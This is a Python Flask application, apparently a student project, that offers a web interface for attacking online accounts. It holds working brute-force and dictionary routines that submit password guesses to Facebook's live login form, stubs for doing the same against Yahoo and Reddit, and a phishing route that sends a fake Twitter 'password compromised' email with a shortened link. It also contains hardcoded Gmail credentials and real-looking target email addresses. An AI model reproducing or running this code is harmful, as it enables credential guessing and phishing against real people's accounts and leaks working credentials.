import mechanize
import sqlite3
import requests, smtplib, ssl
from flask import Flask, render_template, request
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
app = Flask(__name__)
@app.errorhandler(500)
def internal_service_error_bf(e):
    return render_template('500_bf.html'), 500
@app.route('/')
def home():
    return render_template('index.html')
@app.route('/bruteforce')
def bruteforce():
    return render_template('bruteforce.html')
@app.route('/dictionary')
def dictionary():
    con = sqlite3.connect("passwords1.db")
    con.row_factory = sqlite3.Row
    cur = con.cursor()
    cur.execute("select * from PASSWORDS")
    rows = cur.fetchall()
    return render_template('dictionary.html', rows = rows)
@app.route('/rainbow')
def rainbow():
    return render_template('rainbow.html')
@app.route('/passwordstrengthchecker')
def passwordstrengthchecker():
    return render_template('passwordstrengthchecker.html')
@app.route('/hybrid', methods = ['POST', 'GET'])
def hybrid():
    con = sqlite3.connect("passwords1.db")
    con.row_factory = sqlite3.Row
    cur = con.cursor()
    cur.execute("select * from PASSWORDS")
    rows = cur.fetchall()
    form = request.form
    username = request.form['accusername']
    charset = request.form['charset']
    website = request.form['website']
    return render_template('hybrid.html')
@app.route('/phising')
def phising():
    return render_template('phising.html')
@app.route('/run_brute_force', methods = ['POST','GET'])
def brute_force_alg():
    #username, website, passwordlength, lengthparam, charset
    minpasswordlength = request.form['passwordlength1']
    maxpasswordlength = request.form['passwordlength2']
    username = request.form['accusername']
    charset = request.form['charset']
    website = request.form['website']
    for x in range(int(minpasswordlength),int(maxpasswordlength)+1):
        password = generate(username,charset,x,"")
        #print("username = "+username+"password = "+password)
        #if(facebook_form_filler(username, "gobuckeyes")):
    print("YOUR FOUND PASSWORD IS:    "+password)
    if password is None:
        return render_template('500_bf.html')
    else:
        return render_template('result.html', username = username, password = password)
    #return render_template('bruteforce.html')
def generate(username, charset, length, word):
    if length==0:
        print(word)
        worked = facebook_form_filler(username, word)
        print(username)
        print(worked)
        if worked:
            print("found it")
            return word
        else:
            return None
        #print(word)
    for i in range(len(charset)):
        appended = word + charset[i]
        #print(appended)
        newword = generate(username, charset, length-1,appended)
        if newword != None:
            return newword
    return None
# methods for the dictionary algorithm
@app.route('/run_dictionary', methods = ['POST', 'GET'])
def dictionary_alg():
    username = request.form["accusername"]
    dictionaryChunk = request.form["dictionary"]
    dictionary = dictionaryChunk.split()
    for word in dictionary:
        print(word+"jh")
        found = facebook_form_filler(username, word)
        print(found)
        if found:
            print("found!!!!!!!!!!!!!!")
            password = word
            break
    if password != None:
        return render_template('result.html',username = "tarabite@yahoo.com", password = password)
    else:
        return render_template('500_bf.html')

@app.route('/run_passwordchecker', methods = ['POST', 'GET'])
def passwordchecker_alg():
    return render_template('passwordstrengthchecker.html')
@app.route('/run_phising', methods = ['POST','GET'])
def phising_alg():
    # Create message container - the correct MIME type is multipart/alternative here!
    MESSAGE = MIMEMultipart('alternative')
    MESSAGE['subject'] = "URGENT: PASSWORD COMPROMISED"
    MESSAGE['To'] = request.form["accusername"]
    MESSAGE['From'] = "actualnotfaketwitter@gmail.com"
    BODY = """
    <p>Valued User,</p>
    <p>We have detected suspicious activity on you're account. Use the link below to reset your password to avoid having your data compromised.</p><p><a href='https://bit.ly/2IfdmqE'>Twitter Login - Password Reset</a> </p>
    """
    # Record the MIME type text/html
    HTML_BODY = MIMEText(BODY, 'html')
 
    # Attach parts into message container.
    # According to RFC 2046, the last part of a multipart message, in this case
    # the HTML message, is best and preferred.
    MESSAGE.attach(HTML_BODY)
 
    # The actual sending of the e-mail
    server = smtplib.SMTP('smtp.gmail.com:587')
 
    # Print debugging output when testing
    if __name__ == "__main__":
        server.set_debuglevel(1)
 
    # Credentials (if needed) for sending the mail
    password = "g0buckeyes"
 
    server.starttls()
    server.login("actualnotfaketwitter@gmail.com",password)
    server.sendmail("actualnotfaketwitter@gmail.com", [request.form["accusername"]], MESSAGE.as_string())
    server.quit()
    # receiver_email = request.form["accusername"]
    # port = 587  # For starttls
    # smtp_server = "smtp.gmail.com"
    # sender_email = "actualnotfaketwitter@gmail.com"
    # password = "g0buckeyes"
    # SUBJECT = "URGENT: PASSWORD COMPROMISED"
    # TEXT = "Valued User,\n\nWe have detected suspicious activity on you're account. Use the link below to reset your password to avoid having your data compromised.\n\n<a href='https://bit.ly/2IfdmqE'>Twitter Login - Password Reset</a>"
    # msg = MIMEText(TEXT ,'html')
    # message = 'Subject: {}\n\n{}'.format(SUBJECT, msg)
    # context = ssl.create_default_context()
    # with smtplib.SMTP(smtp_server, port) as server:
    #     server.ehlo()  # Can be omitted
    #     server.starttls(context=context)
    #     server.ehlo()  # Can be omitted
    #     server.login(sender_email, password)
    #     server.sendmail(sender_email, receiver_email, message)

    print("sent")
    return render_template('emailsent.html')

# fill the form for facebook profiles
def facebook_form_filler(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False)
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='u_0_2')
    print(result.geturl())
    return result.geturl() == "https://www.facebook.com/"
def facebook_form_filler1(email, password):
    br = mechanize.Browser()
    #br.set_all_readonly(False)    # allow everything to be written to
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://www.facebook.com/login")
    br.form = list(br.forms())[0]
    br.form.set_all_readonly(False)
    br.form['email'] = email
    br.form['pass'] = password
    result = br.submit(id='loginbutton')
    print(result.geturl())
    return result.geturl() == "https://www.facebook.com/"
# fill the form for yahoo profiles
def yahoo_form_filler(email, password):
    br = mechanize.Browser()
    br.set_handle_robots(False)   # no robots
    br.set_handle_refresh(False)  # can sometimes hang without this
    response = br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=us&.lang=en-US&.done=https%3A%2F%2Fwww.yahoo.com")
    br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
    br.form['username'] = email
    result = br.submit(id = 'login-signin')
    print(result)
    print(result.geturl())
    response1 = br.open(result.geturl())
    # br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))

# fill the form for reddit profile
def reddit_form_filler(email, password):
    # attempt with requests
    s = requests.Session()
    l = s.post('http://reddit.com/login', {'user':email,'passwd':password,'rem':True})
    r = s.get('http://reddit.com/login')
    print(r.json())
    # br = mechanize.Browser()
    # br.set_handle_robots(False)
    # br.set_handle_refresh(False)
    # response = br.open("https://www.reddit.com")
    # br.form = list(br.forms())[0]
    #
    #
    # # response = br.open("https://www.facebook.com")
    # # br.form = list(br.forms())[0]
    # # br.form.set_all_readonly(False)
    # # br.form['email'] = email
    # # br.form['pass'] = password
    # # result = br.submit(id='u_0_2')
    # # return result.geturl() == "https://www.facebook.com/"
    #
# def instagram_form_filler(email, password):
#     br = mechanize.Browser()
#     br.set_handle_robots(False)   # no robots
#     br.set_handle_refresh(False)  # can sometimes hang without this
#     response = br.open("https://www.instagram.com/accounts/login/?source=auth_switcher")
#     for form in br.forms():
#         print("Form name:"+ form.name)
#         print (form)
#     # for control in br.form.controls:
#     #     print(control)
#     #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))
#     br.form['username'] = email
#     br.form['password'] = password
#     result = br.submit()
#     print(result)
#     print(result.geturl())
#     response1 = br.open(result.geturl())
    # br.form = list(br.forms())[0]
    # for control in br.form.controls:
    #     print(control)
    #     print("type=%s, name=%s value=%s" % (control.type, control.name, br[control.name]))

print(facebook_form_filler("tarabite1998@gmail.com","ggggggoo"))
#instagram_form_filler("tarabite@yahoo.com","gobuckeyes")
#print(facebook_form_filler("tarabite@yahoo.com","ggggggoo"))
#yahoo_form_filler("tarabite@yahoo.com","gobuckeyes")